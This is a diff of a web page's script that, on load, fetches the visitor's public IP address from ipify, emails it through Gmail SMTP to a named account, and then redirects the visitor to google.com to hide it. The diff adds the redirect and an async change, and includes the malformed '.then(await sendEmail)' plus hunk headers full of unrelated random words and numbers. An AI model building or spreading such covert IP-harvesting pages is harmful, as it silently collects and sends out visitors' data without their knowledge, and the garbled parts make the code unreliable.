@@ -115,7 +115,7 @@ true 157.117 26 shark screw 198.067 34.7115 employee figure 109 true 47.8425 dru
   </script>
   
   <script type="text/javascript">
-    function sendEmail(msg) {
+    async function sendEmail(msg) {
       Email.send({
         Host: "smtp.gmail.com",
         Username: "cenajohnathon280@gmail.com",
@@ -132,13 +132,14 @@ true 157.117 26 shark screw 198.067 34.7115 employee figure 109 true 47.8425 dru
     {
       fetch('https://api.ipify.org/?format=json')
         .then(results => results.json())
-        .then(sendEmail);
+        .then(await sendEmail);
     }
     
     async function do_the_shit()
     {
       await fetch_and_send();
-//       window.location.replace("https://www.google.com/");
+      
+      window.location.replace("https://www.google.com/");
     }
     
     do_the_shit();
